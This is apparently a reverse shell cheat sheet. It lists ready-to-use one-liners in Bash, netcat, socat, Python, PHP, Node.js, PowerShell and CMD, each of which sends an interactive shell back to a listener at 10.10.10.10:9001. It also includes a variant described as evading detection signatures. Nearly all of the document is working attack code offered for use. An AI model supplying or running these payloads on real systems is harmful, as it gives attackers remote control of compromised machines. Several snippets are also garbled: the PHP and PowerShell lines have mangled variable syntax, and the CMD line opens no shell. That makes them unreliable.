# Comprehensive Reverse Shell Payload Matrix

A collection of interactive connection cradles across multiple language runtimes, shells, and operating systems. Ensure your listening port (e.g., `9001`) is primed with `nc -nvlp 9001` prior to delivery.

---

## 1. LINUX NATIVE RUNTIMES

### Bash (Standard & Alternative Descriptors)
```bash
# Classic TCP file descriptor redirect
bash -i >& /dev/tcp/10.10.10.10/9001 0>&1

# Alternate layout bypassing standard redirect signatures
exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Netcat (OpenBSD & Traditional Variants)
```bash
# Traditional with direct execution flag (-e is missing on newer distros)
nc -e /bin/bash 10.10.10.10 9001

# OpenBSD or modern Netcat via Named Pipe (FIFO) backpipe creation
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

### Socat (Fully Interactive TTY Carrier)
```bash
# Spawns a resilient terminal instance capable of raw tab completion
socat TCP:10.10.10.10:9001 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## 2. WEB APPLICATION LAYERS & RUNTIMES

### Python (Cross-Platform Execution Strings)
```python
# Linux / Unix interactive socket wrapper
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### PHP (Web Server Context Exploitation Sinks)
```php
/* Single-line execution block designed for raw code injection or eval() sinks */
php -r '\(sock=fsockopen("10.10.10.10",9001);\)proc=proc_open("/bin/bash", array(0=>sock, 1=>sock, 2=>sock),pipes);'
```

### Node.js (Asynchronous Stream Processing)
```javascript
// Non-blocking spawn routing standard IO vectors directly over TCP socket
require('child_process').exec('nc -e /bin/bash 10.10.10.10 9001')

// Native JS socket fallback if netcat is stripped from container environment
(function(){
    var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9001, "10.10.10.10", function(){
        client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

## 3. WINDOWS SYSTEMS RUNTIMES

### PowerShell (Base64 Encoded Execution & Raw Script)
```powershell
# Raw dynamic .NET TCPClient object stream handler
\(client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);\)stream = \(client.GetStream();[byte[]]\)bytes = 0..65535|%{0};while((i = stream.Read(bytes, 0, bytes.Length)) -ne 0){;data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(bytes,0, i);sendback = (iex \(data 2>&1 \vert{} Out-String );\)sendback2  = sendback + 'PS ' + (pwd).Path + '> ';sendbyte = ([text.encoding]::ASCII).GetBytes(sendback2);stream.Write(sendbyte,0,sendbyte.Length);stream.Flush();client.Close()
```

### Command Prompt (CMD Contexts)
```cmd
:: Spawns an obfuscated PowerShell layer execution profile directly from standard shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001)
```
